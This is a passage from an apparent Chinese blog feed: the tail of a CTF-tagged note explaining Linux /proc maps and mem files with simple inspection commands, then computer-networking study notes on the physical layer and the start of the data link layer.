title="maps"></a>maps</h2><p>maps文件提供了有关当前进程地址空间中内存映射的信息。你可以看到包含当前进程地址空间中所有已映射内存区域（如代码段、数据段、堆、栈等）的详细信息。每一行表示一个内存区域，其中包含了该区域的起始地址、结束地址、访问权限等信息。</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">cat /proc/117/maps<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240310234519798.png" alt="image-20240310234519798"></p><blockquote><p>上面的信息依次如下：</p><p>起始地址-结束地址 权限 偏移量 设备号 节点号 文件名</p></blockquote><h2 id="mem"><a href="#mem" class="headerlink" title="mem"></a>mem</h2><p>&#x2F;proc&#x2F;self&#x2F;mem 是一个特殊文件，它代表当前进程的内存映射。通过对该文件进行读取和写入操作，可以读取和修改当前进程的物理内存。它用于对进程的内存进行读写操作，通常用于调试和分析工具。</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">ls -al /proc/117/mem<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240310235303267.png" alt="image-20240310235303267"></p>]]></content>
      
      
      <categories>
          
          <category> Web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Web CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>计算机网络学习-6</title>
      <link href="/2024/03/09/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E5%AD%A6%E4%B9%A0-6/"/>
      <url>/2024/03/09/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E5%AD%A6%E4%B9%A0-6/</url>
      
        <content type="html"><![CDATA[<!-- toc --><h1 id="物理层概述"><a href="#物理层概述" class="headerlink" title="物理层概述"></a>物理层概述</h1><p>导图：</p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240311085938464.png" alt="image-20240311085938464"></p><p>物理层解决如何在连接各种计算机的传输媒体上传输数据比特流，而不是指具体的传输媒体。</p><p><strong>物理层主要任务：</strong>确定与传输媒体接口有关的一些特性</p><p><strong>物理层特性</strong></p><ol><li>机械特性：定义物理连接的特性，规定物理连接时所采用的规格、接口形状、引线数目、引脚数量和排列情况。</li><li>电气特性：规定传输二进制位时，线路上信号的电压范围、阻抗匹配、传输速率和距离限制等。</li><li>功能特性：指明某条线上出现的某一电平表示何种意义，接口部件的信号线的用途。</li><li>规程特性：(过程特性)定义各条物理线路的工作规程和时序关系。</li></ol><h1 id="数据通信"><a href="#数据通信" class="headerlink" title="数据通信"></a>数据通信</h1><h2 id="数据通信模型"><a href="#数据通信模型" class="headerlink" title="数据通信模型"></a>数据通信模型</h2><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240311133036272.png" alt="image-20240311133036272"></p><p><strong>数字信号和模拟信号</strong></p><p>这两种信号的最主要区别就是：数字信号是离散的，而模拟信号是连续的。</p><p>数字信号是数字化的，在计算机中，CPU只认识“0”和“1”两个数字，所以数字信号需要由“0”和“1”构成的二制数来表示;而摸拟信号则是连续变化的物理量，它的频率、幅度、相位都可以随着时间连续的变化。</p><p><strong>模拟信号：</strong>是指信息参数在给定范围内表现为连续的信号。或在一段连续的时间间隔内，其代表信息的特征量可以在任意瞬间呈现为任意数值的信号。其分布于自然界的各个角落，如每天的温度变化，连续的山峰。</p><p><strong>数字信号：</strong>是指人们抽象出来的时间上不连续的信号，其幅度的取值是离散的，且幅值被限制在有限个数值之内。<br>例如二进制码就是一种数字信号。</p><h2 id="相关术语"><a href="#相关术语" class="headerlink" title="相关术语"></a>相关术语</h2><p>数据通信指在不同计算机之间传输表示信息的二进制数0、1序列的过程。</p><ul><li><p><strong>数据data：</strong>传送信息的实体，通常是有意义的符号序列。</p></li><li><p><strong>信号：</strong>数据的电气&#x2F;电磁的表现，是数据在传输过程中的存在形式。</p></li><li><p><strong>信源：</strong>产生和发送数据的源头。</p></li><li><p><strong>信宿：</strong>接收数据的终点。</p></li><li><p><strong>信道：</strong>信号的传输媒介。一般用来表示向某一个方向传送信息的介质，因此一条通信线路往往包含一条发送信道和一条接收信道。</p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240311133924072.png" alt="image-20240311133924072"></p></li></ul><h2 id="通信方式"><a href="#通信方式" class="headerlink" title="通信方式"></a>通信方式</h2><ol><li><p>单工通信</p><p>只有一个方向的通信而没有反方向的交互，仅需要一条信道。</p></li><li><p>半双工通信&#x2F;双向交替通信</p><p>通信的双方都可以发送或接收信息，但任何一方都不能同时发送和接收需要两条信道。</p></li><li><p>全双工同信&#x2F;双向同时通信</p><p>通信双方可以同时发送和接受信息，也需要两条信道。</p></li></ol><h2 id="数据传输方式"><a href="#数据传输方式" class="headerlink" title="数据传输方式"></a>数据传输方式</h2><ul><li>串行传输和并行和传输</li></ul><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240311134306251.png" alt="image-20240311134306251"></p><ul><li>同步传输和异步传输</li></ul><p><strong>同步传输：</strong>在同步传输的模式下，数据的传送是以一个数据区块为单位，因此同步传输又称为区块传输。<br>在传送数据时，需先送出1个或多个同步字符，再送出整批的数据。</p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240311164351449.png" alt="image-20240311164351449"></p><p><strong>异步传输：</strong></p><p>异步传输将比特分成小组进行传送，小组可以是8位的1个字符或更长。发送方可以在任何时刻发送这些比特组，而接收方不知道它们会在什么时候到达。传送数据时，加一个字符起始位和一个字符终止位。</p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240311164401203.png" alt="image-20240311164401203"></p><h2 id="数据传输相关术语"><a href="#数据传输相关术语" class="headerlink" title="数据传输相关术语"></a>数据传输相关术语</h2><ul><li><p>码元：码元是指用一个固定时长的信号波形_(数字脉冲)，代表不同离散数值的基本波形，是数字通信中数字信号的计量单位，这个时长内的信号称为k进制码元，而该时长称为码元宽度。当码元的离散状态有M个时(M大于2)，此时码元为M进制码元。</p><p>1码元可以携带多个比特的信息量。例如，在使用二进制编码时，只有两种不同的码元，一种代表0状态，另一种代表1状态。</p><p><strong>例如下面的例子：</strong></p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240311165607774.png" alt="image-20240311165607774"></p><p>传递01信号的时候，只有两种状态也就是只有两种码元就叫做二进制码元；如果有四种状态的话的就是四进制码元，此时的一个码元就可以携带两个比特的信息，因为四种状态可以用两个比特表示完全；那么相对的，16进制码元就可以携带四个比特的信息。</p></li><li><p>码元传输速率：别名码元速率、波形速率、调制速率、符号速率等，它表示单位时间内数字通信系统所传输的码元个数(也可称为脉冲个数或信号变化的次数)，单位是波特(Baud)；1波特表示数字通信系统每秒传输一个码元。</p><p>数字信号有多进制和二进制之分，但码元速率与进制数无关，只与码元长度T有关；<strong>T就是上面01信号的一横杠时间，也就是一个状态变化的时间。</strong></p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240311170416392.png" alt="image-20240311170416392"></p></li><li><p>信息传输速率：别名信息速率、比特率等，表示单位时间内数字通信系统传输的二进制码元个数(即比特数)，单位是比特&#x2F;秒(b&#x2F;s)</p><p>若一个码元携带n bit的信息量，那么M Baud的码元传输速率所对应的信息传输速率就为M*n bit&#x2F;s。</p></li><li><p>带宽：</p><ul><li>模拟信号系统中：当输入的信号频率高或低到一定程度，使得系统的输出功率成为输入功率的一半时(即-3dB)，最高频率和最低频率间的差值就代表了系统的通频带宽，其单位为赫兹(Hz)。</li><li>数字设备中：表示在单位时间内从网络中的某一点到另一点所能通过的“最高数据率”&#x2F;单位时间内通过链路的数量，常用来表示网络的通信线路所能传输数据的能力。单位是比特每秒(bps或b&#x2F;s)。带宽更宽，也就是有更大的信息运送能力。</li></ul></li></ul><h1 id="奈氏准则"><a href="#奈氏准则" class="headerlink" title="奈氏准则"></a>奈氏准则</h1><h2 id="失真"><a href="#失真" class="headerlink" title="失真"></a>失真</h2><p>就是因为一些因素干扰，导致传输过程中信号波形改变，导致接收方难以辨认。</p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240311171514652.png" alt="image-20240311171514652"></p><p><strong>影响失真程度的因素：</strong>1.码元传输速率2.信号传输距离3.噪声干扰 4.传输媒体质量</p><p><strong>码间串扰</strong></p><p>因为传输的频率太快导致接收端失去了码元之间清晰界限的现象</p><p><strong>信道带宽</strong></p><p>信道带宽是信道能通过的最高频率和最低频率之差。频率过高会发生码间串扰，过低会导致容易受到干扰导致波形变化太大。</p><p>比如下图：</p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240311181049734.png" alt="image-20240311181049734"></p><p>该图的信道带宽就是3300Hz-300Hz&#x3D;3000Hz</p><h2 id="奈氏准则-奈奎斯特定理"><a href="#奈氏准则-奈奎斯特定理" class="headerlink" title="奈氏准则(奈奎斯特定理)"></a>奈氏准则(奈奎斯特定理)</h2><p><strong>奈式准则</strong>：在理想低通(无噪声，带宽受限)条件下，为了避免码间串扰，极限码元传输速率为2W Baud，W是信道带宽，单位是Hz。</p><p>极限数据传输速率计算如下，也就是上面码元传输速率和信息传输速率的转换。</p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240311181856387.png" alt="image-20240311181856387"></p><p>由奈式准则可以推出下面的结论：</p><ol><li><p>在任何信道中，码元传输的速率是有上限的。若传输速率超过此上限，就会出现严重的码间串扰问题，使接收端对码元的完全正确识别成为不可能。</p></li><li><p>信道的频带越宽(即能通过的信号高频分量越多)，就可以用更高的速率进行码元的有效传输。</p></li><li><p>奈氏准则给出了码元传输速率的限制，但并没有对信息传输速率给出限制。</p></li><li><p>由于码元的传输速率受奈氏准则的制约，所以要提高数据的传输速率，就必须设法使每个码元能携带更多个比特的信息量，这就需要采用多元制的调制方法。</p></li></ol><h1 id="香农定理"><a href="#香农定理" class="headerlink" title="香农定理"></a>香农定理</h1><p>噪声存在于所有的电子设备和通信信道中。由于噪声随机产生，它的瞬时值有时会很大，因此噪声会使接收端对码元的判决产生错误。但是噪声的影响是相对的，若信号较强，那么噪声影响相对较小。因此，信噪比就很重要。<strong>信噪比&#x3D;信号的平均功率&#x2F;噪声的平均功率</strong>，常记为S&#x2F;N，并用分贝(dB)作为度量单位，即:</p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240312093325742.png" alt="image-20240312093325742"></p><p><strong>香农定理</strong>：在带宽受限且有噪声的信道中，为了不产生误差，信息的传输速率有上限值</p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240312093437732.png" alt="image-20240312093437732"></p><p><strong>通过香农定理得出的推论</strong></p><ol><li><p>信道的带宽或信道中的信噪比越大，则信息的极限传输速率就越高。</p></li><li><p>对一定的传输带宽和一定的信噪比，信息传输速率的上限就确定了。</p></li><li><p>只要信息的传输速率低于信道的极限传输速率，就一定能找到某种方法来实现无差错的传输。</p></li><li><p>香农定理得出的为极限信息传输速率，实际信道能达到的传输速率要比它低不少。</p></li><li><p>从香农定理可以看出，若信道带宽W或信噪比S&#x2F;N没有上限(不可能)，那么信道的极限信息传输速率也就没有上限。</p></li></ol><h2 id="奈式和香农的对比"><a href="#奈式和香农的对比" class="headerlink" title="奈式和香农的对比"></a>奈式和香农的对比</h2><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240312094031816.png" alt="image-20240312094031816"></p><p><strong>例题</strong></p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240312094101429.png" alt="image-20240312094101429"></p><p>在两个公式算出的数据传输速率中，应该选择较小的那个才是正确的。</p><h1 id="编码与调制"><a href="#编码与调制" class="headerlink" title="编码与调制"></a>编码与调制</h1><h2 id="基带信号与宽带信号"><a href="#基带信号与宽带信号" class="headerlink" title="基带信号与宽带信号"></a>基带信号与宽带信号</h2><ul><li><p><strong>基带信号：</strong>将数字信号1和0直接用两种不同的电压表示，再送到数字信道上去传输(基带传输)。</p><p>来自信源的信号，像计算机输出的代表各种文字或图像文件的数据信号都属于基带信号。基带信号就是发出的直接表达了要传输的信息的信号，比如我们说话的声波就是基带信号。(所以基带信号也可以是模拟信号，只是在计网中通常指的是数字信号)</p></li><li><p><strong>宽带信号：</strong>将基带信号进行调制后形成的频分复用模拟信号，再传送到模拟信道上去传输(宽带传输)</p><p>把基带信号经过载波调制后，把信号的频率范围搬移到较高的频段以便在信道中传输(即仅在一段频率范围内能够通过信道)。</p></li></ul><p>这两种信号的选择跟传输距离有关，在距离较近时可以直接使用基带信号直接传输，在距离较远的时候就要使用宽带信号防止信号丢失严重。</p><h2 id="编码与调制的区分"><a href="#编码与调制的区分" class="headerlink" title="编码与调制的区分"></a>编码与调制的区分</h2><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240312135128620.png" alt="image-20240312135128620"></p><h2 id="编码与调制的具体方式"><a href="#编码与调制的具体方式" class="headerlink" title="编码与调制的具体方式"></a>编码与调制的具体方式</h2><h3 id="数字数据编码为数字信号"><a href="#数字数据编码为数字信号" class="headerlink" title="数字数据编码为数字信号"></a>数字数据编码为数字信号</h3><p>以下面的二进制数据来介绍各种编码方式：</p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240312141043018.png" alt="image-20240312141043018"></p><ol><li><p>非归零编码【NRZ】</p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240312141144428.png" alt="image-20240312141144428"></p><p>特点就是高1低0，该编码很容易实现，但没有纠错功能，且无法判断一个码元的开始和结束，以至于收发双方难以保持同步。</p></li><li><p>曼彻斯特编码</p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240312141802576.png" alt="image-20240312141802576"></p><p>将一个码元分成两个相等的间隔，前一个间隔为低电平后一个间隔为高电平表示码元1;码元0则正好相反。也可以采用相反的规定。该编码的特点是在每一个码元的中间出现电平跳变，位于中间的跳变既作时钟信号(可用于同步)又作数据信号，但它所占的频带宽度是原始的基带宽度的两倍。</p><p><strong>所以数据传输速率只有调制速率的1&#x2F;2</strong></p></li><li><p>差分曼彻斯特编码</p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240312142117689.png" alt="image-20240312142117689"></p><p>常用于局域网传输，其规则是:若码元为1，则前半个码元的电平与上一个码元的后半个码元的电平相同，若为0，则相反。该编码的特点是，在每个码元的中间，都有一次电平的跳转，可以实现自同步，且抗干扰性强于曼彻斯特编码。</p></li><li><p>归零编码【RZ】</p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240312141301827.png" alt="image-20240312141301827"></p><p>就是信号电平在一个码元之内都要恢复到零。</p></li><li><p>反向不归零编码【NRZI】</p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240312141439802.png" alt="image-20240312141439802"></p><p>信号电平翻转表示0，信号电平不变表示1.</p></li><li><p>4B&#x2F;5B编码</p><p>比特流中插入额外的比特以打破一连串的0或1，就是用5个比特来编码4个比特的数据，之后再传给接收方，因此称为4B&#x2F;5B。编码效率为80%。</p><p>只采用16种编码对应16种不同的4位码，多出来的16种作为控制码(帧的开始和结束，线路的状态信息等)或保留。</p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240312142425457.png" alt="image-20240312142425457"></p></li></ol><h3 id="数字数据调制为模拟信号"><a href="#数字数据调制为模拟信号" class="headerlink" title="数字数据调制为模拟信号"></a>数字数据调制为模拟信号</h3><p>数字数据调制技术在发送端将数字信号转换为模拟信号，而在接收端将模拟信号还原为数字信号，分别对应于调制解调器的调制和解调过程。</p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240312142828014.png" alt="image-20240312142828014"></p><ul><li>调幅：为1时有幅度，为0时无幅度</li><li>调频：为0时频率较低，为1时频率较高</li><li>调相：即不同状态时波形的相位不同</li></ul><blockquote><p>还可以使用调幅+调相的组合方式(QAM)。</p></blockquote><p><strong>例题</strong></p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240312143129934.png" alt="image-20240312143129934"></p><blockquote><p>这里相当于有4<em>4&#x3D;16种码元，也就是一码元传输四比特信息，所以是1200</em>4&#x3D;4800b&#x2F;s</p></blockquote><h3 id="模拟数据编码为数字信号"><a href="#模拟数据编码为数字信号" class="headerlink" title="模拟数据编码为数字信号"></a>模拟数据编码为数字信号</h3><p>计算机内部处理的是二进制数据，处理的都是数字音频，所以需要将模拟音频通过采样、量化转换成有限个数字表示的离散序列(即实现音频数字化)。</p><p>最典型的例子就是对音频信号进行编码的脉码调制(PCM)，在计算机应用中，能够达到最高保真水平的就是PCM编码，被广泛用于素材保存及音乐欣赏，CD、DVD以及我们常见的 WAV文件中均有应用。它主要包括三步:抽样、量化、编码</p><ol><li><p>抽样</p><p>对模拟信号周期性扫描，把时间上连续的信号变成时间上离散的信号。为了使所得的离散信号能无失真地代表被抽样的模拟数据，要使用采样定理进行采样:<strong>f(采样频率)<strong>大于等于</strong>2f(信号最高频率)</strong></p></li><li><p>量化</p><p>把抽样取得的电平幅值按照一定的分级标度转化为对应的数字值，并取整数，这就把连续的电平幅值转换为离散的数字量。</p></li><li><p>编码</p><p>把量化的结果转换为与之对应的二进制编码。</p></li></ol><h3 id="模拟数据调制为模拟信号"><a href="#模拟数据调制为模拟信号" class="headerlink" title="模拟数据调制为模拟信号"></a>模拟数据调制为模拟信号</h3><p>为了实现传输的有效性，可能需要较高的频率。这种调制方式还可以使用频分复用技术，充分利用带宽资源。在电话机和本地交换机所传输的信号是采用模拟信号传输模拟数据的方式;模拟的声音数据是加载到模拟的载波信号中传输的。</p><h1 id="数据交换方式"><a href="#数据交换方式" class="headerlink" title="数据交换方式"></a>数据交换方式</h1><p>有三种数据交换方式：</p><p><strong>电路交换</strong>、<strong>报文交换</strong>、<strong>分组交换</strong></p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240312145450698.png" alt="image-20240312145450698"></p><h2 id="电路交换-Circuit-Exchanging"><a href="#电路交换-Circuit-Exchanging" class="headerlink" title="电路交换(Circuit Exchanging)"></a>电路交换(Circuit Exchanging)</h2><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240312145914210.png" alt="image-20240312145914210"></p><p>连接之后通信方式是全双工的。</p><p>释放连接的方式同理，发送释放连接请求然后等待确认响应。</p><p><strong>特点：</strong>独占资源，用户始终占用端到端的固定传输带宽。适用于远程批处理信息传输或系统间实时性要求高的大量数据传输的情况。</p><p><strong>电路交换优缺点</strong></p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240312150144149.png" alt="image-20240312150144149"></p><h2 id="报文交换-Message-Exchanging"><a href="#报文交换-Message-Exchanging" class="headerlink" title="报文交换(Message Exchanging)"></a>报文交换(Message Exchanging)</h2><p><strong>报文：</strong>报文(message)是网络中交换与传输的数据单元，即站点一次性要发送的数据块。报文包含了将要发送的完整的数据信息，其长短很不一致，长度不限且可变。</p><p><strong>原理：</strong>无需在两个站点之间建立一条专用通路，其数据传输的单位是报文，传送过程采用存储转发方式。</p><p><strong>过程：</strong></p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240312150452238.png" alt="image-20240312150452238"></p><p><strong>优缺点：</strong></p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240312150532682.png" alt="image-20240312150532682"></p><h2 id="分组交换-Packet-Exchanging"><a href="#分组交换-Packet-Exchanging" class="headerlink" title="分组交换(Packet Exchanging)"></a>分组交换(Packet Exchanging)</h2><p><strong>分组：</strong>大多数计算机网络都不能连续地传送任意长的数据，所以实际上网络系统把数据分割成小块，然后逐块地发送，这种小块就称作分组(packet)。分组交换是现在网络中传输数据最常用的方式。</p><p><strong>分组交换的原理：</strong><br>分组交换与报文交换的工作方式基本相同，都采用存储转发方式，形式上的主要差别在于，分组交换网中要限制所传输的数据单位的长度，一般选128B。发送节点首先对从终端设备送来的数据报文进行接收存储，而后将报文划分成一定长度的分组，并以分组为单位进行传输和交换。接收结点将收到的分组组装成信息或报文。</p><p><strong>过程：</strong></p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240312150939221.png" alt="image-20240312150939221"></p><p><strong>优缺点</strong></p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240312151003760.png" alt="image-20240312151003760"></p><h3 id="数据报方式"><a href="#数据报方式" class="headerlink" title="数据报方式"></a>数据报方式</h3><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240312151546362.png" alt="image-20240312151546362"></p><p><strong>特点</strong></p><ol><li><p>数据报方式为网络层提供无连接服务。发送方可随时发送分组，网络中的结点可随时接收分组。</p><p><strong>无连接服务：</strong>不事先为分组的传输确定传输路径，每个分组独立确定传输路径不同分组传输路径可能不同。</p></li><li><p>同一报文的不同分组达到目的结点时可能发生乱序、重复与丢失。</p></li><li><p>每个分组在传输过程中都必须携带源地址和目的地址，以及分组号。</p></li><li><p>分组在交换结点存储转发时，需要排队等候处理，这会带来一定的时延。当通过交换结点的通信量较大或网络发生拥塞时，这种时延会大大增加，交换结点还可根据情况丢弃部分分组。</p></li><li><p>网络具有冗余路径，当某一交换结点或一段链路出现故障时，可相应地更新转发表，寻找另一条路径转发分组，对故障的适应能力强，适用于突发性通信，不适于长报文，会话式通信。</p></li></ol><h3 id="虚电路方式"><a href="#虚电路方式" class="headerlink" title="虚电路方式"></a>虚电路方式</h3><p>虚电路将数据报方式和电路交换方式结合，以发挥两者优点。</p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240312152224056.png" alt="image-20240312152224056"></p><p><strong>特点</strong></p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240312152525446.png" alt="image-20240312152525446"></p><h3 id="数据报和虚电路对比"><a href="#数据报和虚电路对比" class="headerlink" title="数据报和虚电路对比"></a>数据报和虚电路对比</h3><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240312152559654.png" alt="image-20240312152559654"></p><h2 id="交换方式的选择"><a href="#交换方式的选择" class="headerlink" title="交换方式的选择"></a>交换方式的选择</h2><ol><li><p>传送数据量大，且传送时间远大于呼叫时，选择电路交换。电路交换传输时延最小。</p></li><li><p>当端到端的通路有很多段的链路组成时,采用分组交换传送数据较为合适。</p></li><li><p>从信道利用率上看，报文交换和分组交换优于电路交换，其中分组交换比报文交换的时延小，尤其适合于计算机之间的突发式的数据通信。</p></li></ol><h1 id="物理层传输介质"><a href="#物理层传输介质" class="headerlink" title="物理层传输介质"></a>物理层传输介质</h1><p>传输介质也称传输媒体&#x2F;传输媒介，它就是数据传输系统中在发送设备和接收设备之间的<strong>物理通路</strong>。</p><p><strong>传输媒体并不是物理层</strong>，传输媒体在物理层的下面，因为物理层是体系结构的第一层，因此有时称传输媒体为0层。在传输媒体中传输的是信号，但传输媒体并不知道所传输的信号代表什么意思。但物理层规定了电气特性，因此能够识别所传送的比特流。</p><p><strong>传输介质</strong></p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240312152930074.png" alt="image-20240312152930074"></p><h2 id="导向型传输介质"><a href="#导向型传输介质" class="headerlink" title="导向型传输介质"></a>导向型传输介质</h2><h3 id="双绞线"><a href="#双绞线" class="headerlink" title="双绞线"></a>双绞线</h3><p>双绞线是古老、又最常用的传输介质，它由两根采用一定规则并排绞合的、相互绝缘的铜导线组成。</p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240312153151300.png" alt="image-20240312153151300"></p><blockquote><p>双绞线价格便宜，是最常用的传输介质之一，在局域网和传统电话网中普遍使用。模拟传输和数字传输都可以使用双绞线，其通信距离一般为几公里到数十公里。距离太远时，对于模拟传输，要用放大器放大衰减的信号;对于数字传输，要用中继器将失真的信号整形。</p></blockquote><h3 id="同轴电缆"><a href="#同轴电缆" class="headerlink" title="同轴电缆"></a>同轴电缆</h3><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240312153436424.png" alt="image-20240312153436424"></p><h3 id="光纤"><a href="#光纤" class="headerlink" title="光纤"></a>光纤</h3><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240312153803723.png" alt="image-20240312153803723"></p><p><strong>单模光纤和多模光纤</strong></p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240312153940233.png" alt="image-20240312153940233"></p><p><strong>光纤的特点</strong></p><p>1.传输损耗小，中继距离长，对远距离传输特别经济。</p><p>2.抗雷电和电磁干扰性能好。</p><p>3.无串音干扰，保密性好，也不易被窃听或截取数据。</p><p>4.体积小，重量轻。</p><h2 id="非导向型传输介质"><a href="#非导向型传输介质" class="headerlink" title="非导向型传输介质"></a>非导向型传输介质</h2><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240312154418577.png" alt="image-20240312154418577"></p><p>微波就是利用中继器进行接力通信</p><h1 id="物理层设备"><a href="#物理层设备" class="headerlink" title="物理层设备"></a>物理层设备</h1><h2 id="中继器"><a href="#中继器" class="headerlink" title="中继器"></a>中继器</h2><p><strong>诞生原因：</strong>由于存在损耗，在线路上传输的信号功率会逐渐衰减，衰减到一定程度时将造成信号失真，因此会导致接收错误。</p><p><strong>中继器的功能：</strong>对信号进行&#x3D;&#x3D;再生和还原&#x3D;&#x3D;，对衰减的信号进行放大，保持与原数据相同，以增加信号传输的距离，延长网络的长度。</p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240312154708719.png" alt="image-20240312154708719"></p><p><strong>中继器的两端：</strong>两端的网络部分是网段，而不是子网，适用于完全相同的两类网络的互连，且两个网段速率要相同。</p><p>中继器只将任何电缆段上的数据发送到另一段电缆上，它仅作用于信号的电气部分，并不管数据中是否有错误数据或不适于网段的数据。</p><p>两端可连相同媒体，也可连不同媒体。</p><p>中继器两端的网段一定要是同一个协议，因为中继器不会存储转发。</p><p><strong>5-4-3规则：</strong>网络标准中都对信号的延迟范围作了具体的规定，因而中继器只能在规定的范围内进行，否则会网络故障。</p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240312155118594.png" alt="image-20240312155118594"></p><p>比如10M以太网中的5-4-3规则：</p><ol><li><p>5 个网段 : 中继器连接的网络中 , 只允许最多有5个网段 , 每个中继器 两端可以有两个网段 。</p></li><li><p>4 个中继器 : 5个网段内 , 最多有4个中继器 。</p></li><li><p>3 个计算机挂载点 : 只有3个网段可以挂载计算机 。</p></li></ol><h2 id="集线器-多口中继器"><a href="#集线器-多口中继器" class="headerlink" title="集线器(多口中继器)"></a>集线器(多口中继器)</h2><p><strong>功能：</strong>对信号进行再生放大转发，对衰减的信号进行放大，接着转发到其他所有(除输入端口外)处于工作状态的端口上，以增加信号传输的距离，延长网络的长度。不具备信号的定向传送能力，是一个共享式设备。</p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240312155755183.png" alt="image-20240312155755183"></p>]]></content>
      
      
      <categories>
          
          <category> 基础 计网 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 计网 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>计算机网络学习-5</title>
      <link href="/2024/03/09/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E5%AD%A6%E4%B9%A0-5/"/>
      <url>/2024/03/09/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E5%AD%A6%E4%B9%A0-5/</url>
      
        <content type="html"><![CDATA[<h1 id="数据链路层概述"><a href="#数据链路层概述" class="headerlink" title="数据链路层概述"></a>数据链路层概述</h1><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240319002608096.png" alt="image-20240319002608096"></p><h2 id="基本概念"><a href="#基本概念" class="headerlink" title="基本概念"></a>基本概念</h2><p><strong>结点</strong>：主机、路由器。</p><p><strong>链路</strong>：网络中两个结点之间的物理通道，链路的传输介质主要有双绞线、光纤和微波。分为有线链路、无线链路。</p><p><strong>数据链路</strong>：网络中两个结点之间的逻辑通道，把实现控制数据传输协议的硬件和软件加到链路上就构成数据链路。</p><p><strong>帧</strong>：链路层的协议数据单元，封装网络层数据报。</p><h2 id="功能概述"><a href="#功能概述" class="headerlink" title="功能概述"></a>功能概述</h2><p>数据链路层在物理层提供服务的基础上向网络层提供服务，其最基本的服务是将源自网络层来的数据可靠地传输到相邻节点的目标机网络层。其主要作用是加强物理层传输原始比特流的功能，将物理层提供的可能出错的物理连接改造成为逻辑上无差错的数据链路，使之对网络层表现为一条无差错的链路。</p><p><strong>功能一</strong>：为网络层提供服务。无确认无连接服务，有确认无连接服务，有确认面向连接服务。</p><p><strong>功能二</strong>：链路管理，即连接的建立、维持、释放(用于面向连接的服务)。</p><p><strong>功能三</strong>：组帧。</p><p><strong>功能四</strong>：流量控制。</p><p><strong>功能五</strong>：差错控制（帧错&#x2F;位错）</p><h1 id="封装成帧"><a href="#封装成帧" class="headerlink" title="封装成帧"></a>封装成帧</h1><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240319003822417.png" alt="image-20240319003822417"></p><h2 id="透明传输"><a href="#透明传输" class="headerlink" title="透明传输"></a>透明传输</h2><p>透明传输是指不管所传数据是什么样的比特组合，都应当能够在链路上传送。因此，链路层就“看不见”有什么妨碍数据传输的东西。<br>当所传数据中的比特组合恰巧与某一个控制信息完全一样时，就必须采取适当的措施，使收方不会将这样的数据误认为是某种控制信息。这样才能保证数据链路层的传输是透明的。</p><h2 id="四种组帧方法"><a href="#四种组帧方法" class="headerlink" title="四种组帧方法"></a>四种组帧方法</h2><h3 id="字符计数法"><a href="#字符计数法" class="headerlink" 